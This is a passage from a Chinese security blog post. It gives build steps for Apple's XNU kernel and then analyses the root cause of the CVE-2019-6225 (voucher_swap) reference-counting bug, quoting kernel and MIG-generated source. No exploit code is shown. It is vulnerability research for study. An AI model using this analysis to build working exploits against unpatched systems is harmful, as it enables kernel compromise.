class="variable">$TOOLCHAIN</span>&quot;</span> <span class="string">&quot;<span class="variable">$TOOLCHAIN</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="编译错误"><a href="#编译错误" class="headerlink" title="编译错误"></a>编译错误</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: <span class="string">&#x27;elf.h&#x27;</span> file not found with &lt;angled&gt; include; use <span class="string">&quot;quotes&quot;</span> instead</span><br></pre></td></tr></table></figure>

<p>没找到解决方案</p>
<h4 id="编译AvailabilityVersions"><a href="#编译AvailabilityVersions" class="headerlink" title="编译AvailabilityVersions"></a>编译AvailabilityVersions</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar zxf AvailabilityVersions-33.200.4.tar.gz</span><br><span class="line"><span class="built_in">cd</span> AvailabilityVersions-33.200.4</span><br><span class="line">make install</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/dst/usr/local/libexec&quot;</span> \</span><br><span class="line"><span class="string">&quot;<span class="subst">$(xcrun -sdk macosx -show-sdk-path)</span>/usr/local/libexec&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="编译libdispatch"><a href="#编译libdispatch" class="headerlink" title="编译libdispatch"></a>编译libdispatch</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> libdispatch-1008.220.2</span><br><span class="line">xcodebuild install -sdk macosx ARCHS=<span class="string">&#x27;x86_64 arm64e&#x27;</span> \</span><br><span class="line">VALID_ARCHS=<span class="string">&#x27;x86_64 arm64e&#x27;</span> -target libfirehose_kernel \</span><br><span class="line">PRODUCT_NAME=firehose_kernel DSTROOT=<span class="variable">$PWD</span>/dst</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/dst/usr/local&quot;</span> \</span><br><span class="line"><span class="string">&quot;<span class="subst">$(xcrun -sdk macosx -show-sdk-path)</span>/usr/local&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h4><p>安装XNU头文件，依赖于前面的编译结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> xnu-4903.221.2</span><br><span class="line">make SDKROOT=macosx ARCH_CONFIGS=<span class="string">&quot;X86_64 ARM64&quot;</span> installhdrs</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/BUILD/dst&quot;</span> <span class="string">&quot;<span class="subst">$(xcrun -sdk macosx -show-sdk-path)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>内核编译可以基于<code>KERNEL_CONFIGS</code>&amp;<code>ARCH_CONFIGS</code>变量作为参数构建内核：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make SDKROOT=&lt;sdkroot&gt; ARCH_CONFIGS=&lt;arch&gt; KERNEL_CONFIGS=&lt;variant&gt;</span><br></pre></td></tr></table></figure>

<p>参数解释：</p>
<ul>
<li><code>&lt;sdkroot&gt;</code>：磁盘上 MacOS SDK 的路径（默认为<code>/</code>）。</li>
<li><code>&lt;variant&gt;</code>: 可以是<code>debug</code>, <code>development</code>, <code>release</code>,<code>profile</code>并在整个内核代码中配置编译标志和断言。</li>
<li><code>&lt;arch&gt;</code>：编译架构。（例如<code>i386</code>或<code>X86_64</code>）</li>
</ul>
<p>一些编译示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ make SDKROOT=macosx.internal ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=DEVELOPMENT</span><br><span class="line">$ make SDKROOT=macosx.internal ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=<span class="string">&quot;RELEASE DEVELOPMENT DEBUG&quot;</span></span><br></pre></td></tr></table></figure>

<p>直接<code>make</code>表示架构设置为本地架构，默认内核配置为<code>development</code>。</p>
<p>编译没成功，不知道是不是SDK不匹配的原因。</p>
<h1 id="voucher-sawp漏洞的发现"><a href="#voucher-sawp漏洞的发现" class="headerlink" title="voucher_sawp漏洞的发现"></a>voucher_sawp漏洞的发现</h1><p>漏洞编号为CVE-2019-6225，存在漏洞的xnu内核代码为<a target="_blank" rel="noopener" href="https://opensource.apple.com/tarballs/xnu/xnu-4903.221.2.tar.gz">xnu-4903.221.2</a>。漏洞出现在task_swap_mach_voucher()函数中，主要是MIG生成代码导致的引用计数问题。创建或复制对象会将其引用计数加1，而销毁或覆盖对象会将其引用计数减1。如果对象的引用计数达到零，则将释放该对象。在内存有限的系统中，引用计数比垃圾回收(它是循环发生的，可能会耗费时间)更有效，因为可以在对象的引用计数为零时立即释放对象，从而提高了系统的整体响应能力。</p>
<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>问题出现在<code>task_swap_mach_voucher()</code>（<code>osfmk/kern/task.c</code>）中，功能就是用新的voucher替换旧的voucher：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Placeholders for the task set/get voucher interfaces */</span></span><br><span class="line">......</span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_swap_mach_voucher</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">task_t</span>			task,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_voucher_t</span>		new_voucher,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_voucher_t</span>		*in_out_old_voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (TASK_NULL == task)</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_TASK;</span><br><span class="line"></span><br><span class="line">	*in_out_old_voucher = new_voucher;</span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据注释信息可知，<code>task_swap_mach_voucher</code>函数是一个占位符。可在<code>osfmk/mach/task.defs</code>中找到它：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">routine <span class="title function_">task_swap_mach_voucher</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		new_voucher	: <span class="type">ipc_voucher_t</span>;</span></span><br><span class="line"><span class="params">	inout	old_voucher	: <span class="type">ipc_voucher_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>这意味着它实际上是Mach API，因为MIG def文件为Mach接口生成代码。<code>/BUILD/obj/RELEASE_X86_64/osfmk/mach/task.h</code>中可以找到此函数的Mach消息格式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push, 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">mach_msg_header_t</span> Head;</span><br><span class="line">		<span class="comment">/* start of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_body_t</span> msgh_body;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> old_voucher;</span><br><span class="line">		<span class="comment">/* end of the kernel processed data */</span></span><br><span class="line">	&#125; __Reply__task_swap_mach_voucher_t __attribute__((unused));</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><code>/BUILD/obj/RELEASE_X86_64/osfmk/RELEASE/mach/task_server.c</code>中可以看到对请求执行的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mig_internal <span class="type">kern_return_t</span> __MIG_check__Request__task_swap_mach_voucher_t(__attribute__((__unused__)) __Request__task_swap_mach_voucher_t *In0P)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">typedef</span> __Request__task_swap_mach_voucher_t __Request;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigTypeCheck</span></span><br><span class="line">	<span class="keyword">if</span> (!(In0P-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX) ||</span><br><span class="line">	    (In0P-&gt;msgh_body.msgh_descriptor_count != <span class="number">2</span>) ||</span><br><span class="line">	    (In0P-&gt;Head.msgh_size != (<span class="type">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(__Request)))</span><br><span class="line">		<span class="keyword">return</span> MIG_BAD_ARGUMENTS;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MigTypeCheck */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigTypeCheck</span></span><br><span class="line">	<span class="keyword">if</span> (In0P-&gt;new_voucher.type != MACH_MSG_PORT_DESCRIPTOR ||</span><br><span class="line">	    In0P-&gt;new_voucher.disposition != <span class="number">17</span>)</span><br><span class="line">		<span class="keyword">return</span> MIG_TYPE_ERROR;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MigTypeCheck */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigTypeCheck</span></span><br><span class="line">	<span class="keyword">if</span> (In0P-&gt;old_voucher.type != MACH_MSG_PORT_DESCRIPTOR ||</span><br><span class="line">	    In0P-&gt;old_voucher.disposition != <span class="number">17</span>)</span><br><span class="line">		<span class="keyword">return</span> MIG_TYPE_ERROR;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MigTypeCheck */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> MACH_MSG_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Routine task_swap_mach_voucher */</span></span><br><span class="line">mig_internal novalue _Xtask_swap_mach_voucher</span><br><span class="line">	(<span class="type">mach_msg_header_t</span> *InHeadP, <span class="type">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push, 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">mach_msg_header_t</span> Head;</span><br><span class="line">		<span class="comment">/* start of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_body_t</span> msgh_body;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> new_voucher;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> old_voucher;</span><br><span class="line">		<span class="comment">/* end of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_trailer_t</span> trailer;</span><br><span class="line">	&#125; Request __attribute__((unused));</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> __Request__task_swap_mach_voucher_t __Request;</span><br><span class="line">	<span class="keyword">typedef</span> __Reply__task_swap_mach_voucher_t Reply __attribute__((unused));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * typedef struct &#123;</span></span><br><span class="line"><span class="comment">	 * 	mach_msg_header_t Head;</span></span><br><span class="line"><span class="comment">	 * 	NDR_record_t NDR;</span></span><br><span class="line"><span class="comment">	 * 	kern_return_t RetCode;</span></span><br><span class="line"><span class="comment">	 * &#125; mig_reply_error_t;</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	Request *In0P = (Request *) InHeadP;</span><br><span class="line">	Reply *OutP = (Reply *) OutHeadP;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>	__MIG_check__Request__task_swap_mach_voucher_t__defined</span></span><br><span class="line">	<span class="type">kern_return_t</span> check_result;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MIG_check__Request__task_swap_mach_voucher_t__defined */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigKernelSpecificCode</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	UseStaticTemplates</span></span><br><span class="line">	<span class="type">const</span> <span class="type">static</span> <span class="type">mach_msg_port_descriptor_t</span> old_voucherTemplate = &#123;</span><br><span class="line">		<span class="comment">/* name = */</span>		MACH_PORT_NULL,</span><br><span class="line">		<span class="comment">/* pad1 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* pad2 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* disp = */</span>		<span class="number">17</span>,</span><br><span class="line">		<span class="comment">/* type = */</span>		MACH_MSG_PORT_DESCRIPTOR,</span><br><span class="line">	&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	UseStaticTemplates</span></span><br><span class="line">	<span class="type">const</span> <span class="type">static</span> <span class="type">mach_msg_port_descriptor_t</span> old_voucherTemplate = &#123;</span><br><span class="line">		<span class="comment">/* name = */</span>		MACH_PORT_NULL,</span><br><span class="line">		<span class="comment">/* pad1 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* pad2 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* disp = */</span>		<span class="number">19</span>,</span><br><span class="line">		<span class="comment">/* type = */</span>		MACH_MSG_PORT_DESCRIPTOR,</span><br><span class="line">	&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __MigKernelSpecificCode */</span></span></span><br><span class="line">	<span class="type">kern_return_t</span> RetCode;</span><br><span class="line">	<span class="type">task_t</span> task;</span><br><span class="line">	<span class="type">ipc_voucher_t</span> new_voucher;</span><br><span class="line">	<span class="type">ipc_voucher_t</span> old_voucher;</span><br><span class="line"></span><br><span class="line">	__DeclareRcvRpc(<span class="number">3441</span>, <span class="string">&quot;task_swap_mach_voucher&quot;</span>)</span><br><span class="line">	__BeforeRcvRpc(<span class="number">3441</span>, <span class="string">&quot;task_swap_mach_voucher&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	defined(__MIG_check__Request__task_swap_mach_voucher_t__defined)</span></span><br><span class="line">	check_result = __MIG_check__Request__task_swap_mach_voucher_t((__Request *)In0P);</span><br><span class="line">	<span class="keyword">if</span> (check_result != MACH_MSG_SUCCESS)</span><br><span class="line">		&#123; MIG_RETURN_ERROR(OutP, check_result); &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* defined(__MIG_check__Request__task_swap_mach_voucher_t__defined) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	UseStaticTemplates</span></span><br><span class="line">	OutP-&gt;old_voucher = old_voucherTemplate;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __MigKernelSpecificCode</span></span><br><span class="line">	OutP-&gt;old_voucher.disposition = <span class="number">17</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	OutP-&gt;old_voucher.disposition = <span class="number">19</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __MigKernelSpecificCode */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !(defined(KERNEL) &amp;&amp; defined(__LP64__))</span></span><br><span class="line">	OutP-&gt;old_voucher.pad1 = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	OutP-&gt;old_voucher.pad2 = <span class="number">0</span>;</span><br><span class="line">	OutP-&gt;old_voucher.type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(KERNEL)</span></span><br><span class="line">	OutP-&gt;old_voucher.pad_end = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	task = convert_port_to_task(In0P-&gt;Head.msgh_request_port);</span><br><span class="line"></span><br><span class="line">	new_voucher = convert_port_to_voucher(In0P-&gt;new_voucher.name);</span><br><span class="line"></span><br><span class="line">	old_voucher = convert_port_to_voucher(In0P-&gt;old_voucher.name);</span><br><span class="line"></span><br><span class="line">	RetCode = task_swap_mach_voucher(task, new_voucher, &amp;old_voucher);</span><br><span class="line">	ipc_voucher_release(new_voucher);</span><br><span class="line">	task_deallocate(task);</span><br><span class="line">	<span class="keyword">if</span> (RetCode != KERN_SUCCESS) &#123;</span><br><span class="line">		MIG_RETURN_ERROR(OutP, RetCode);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigKernelSpecificCode</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IP_VALID((<span class="type">ipc_port_t</span>)In0P-&gt;old_voucher.name))</span><br><span class="line">		ipc_port_release_send((<span class="type">ipc_port_t</span>)In0P-&gt;old_voucher.name);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IP_VALID((<span class="type">ipc_port_t</span>)In0P-&gt;new_voucher.name))</span><br><span class="line">		ipc_port_release_send((<span class="type">ipc_port_t</span>)In0P-&gt;new_voucher.name);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __MigKernelSpecificCode */</span></span></span><br><span class="line">	OutP-&gt;old_voucher.name = (<span class="type">mach_port_t</span>)convert_voucher_to_port(old_voucher);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	OutP-&gt;Head.msgh_bits |= MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">	OutP-&gt;Head.msgh_size = (<span class="type">mach_msg_size_t</span>)(<span class="keyword">sizeof</span>(Reply));</span><br><span class="line">	OutP-&gt;msgh_body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line">	__AfterRcvRpc(<span class="number">3441</span>, <span class="string">&quot;task_swap_mach_voucher&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>convert_port_to_voucher</code>函数通过调用<code>ipc_voucher_reference</code>函数将引用计数增加1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	convert_port_to_voucher</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Convert from a port to a voucher.</span></span><br><span class="line"><span class="comment"> *		Doesn&#x27;t consume the port [send-right] ref;</span></span><br><span class="line"><span class="comment"> *		produces a voucher ref,	which may be null.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Caller has a send-right reference to port.</span></span><br><span class="line"><span class="comment"> *		Port may or may not be locked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ipc_voucher_t</span></span><br><span class="line"><span class="title function_">convert_port_to_voucher</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_port_t</span>	port)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (IP_VALID(port)) &#123;</span><br><span class="line">		<span class="type">ipc_voucher_t</span> voucher = (<span class="type">ipc_voucher_t</span>) port-&gt;ip_kobject;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * No need to lock because we have a reference on the</span></span><br><span class="line"><span class="comment">		 * port, and if it is a true voucher port, that reference</span></span><br><span class="line"><span class="comment">		 * keeps the voucher bound to the port (and active).</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (ip_kotype(port) != IKOT_VOUCHER)</span><br><span class="line">			<span class="keyword">return</span> IV_NULL;</span><br><span class="line"></span><br><span class="line">		assert(ip_active(port));</span><br><span class="line"></span><br><span class="line">		ipc_voucher_reference(voucher);</span><br><span class="line">		<span class="keyword">return</span> (voucher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> IV_NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>convert_voucher_to_port</code>函数通过调用<code>ipc_voucher_release</code>函数将引用计数减少1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Convert a voucher to a port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ipc_port_t</span></span><br><span class="line"><span class="title function_">convert_voucher_to_port</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ipc_port_t</span>	port, send;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IV_NULL == voucher)</span><br><span class="line">		<span class="keyword">return</span> (IP_NULL);</span><br><span class="line"></span><br><span class="line">	assert(os_ref_get_count(&amp;voucher-&gt;iv_refs) &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create a port if needed */</span></span><br><span class="line">	port = voucher-&gt;iv_port;</span><br><span class="line">	<span class="keyword">if</span> (!IP_VALID(port)) &#123;</span><br><span class="line">		port = ipc_port_alloc_kernel();</span><br><span class="line">		assert(IP_VALID(port));</span><br><span class="line">		ipc_kobject_set_atomically(port, (<span class="type">ipc_kobject_t</span>) voucher, IKOT_VOUCHER);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* If we lose the race, deallocate and pick up the other guy&#x27;s port */</span></span><br><span class="line">		<span class="keyword">if</span> (!OSCompareAndSwapPtr(IP_NULL, port, &amp;voucher-&gt;iv_port)) &#123;</span><br><span class="line">			ipc_port_dealloc_kernel(port);</span><br><span class="line">			port = voucher-&gt;iv_port;</span><br><span class="line">			assert(ip_kotype(port) == IKOT_VOUCHER);</span><br><span class="line">			assert(port-&gt;ip_kobject == (<span class="type">ipc_kobject_t</span>)voucher);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	ip_lock(port);</span><br><span class="line">	assert(ip_active(port));</span><br><span class="line">	send = ipc_port_make_send_locked(port);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">1</span> == port-&gt;ip_srights) &#123;</span><br><span class="line">		<span class="type">ipc_port_t</span> 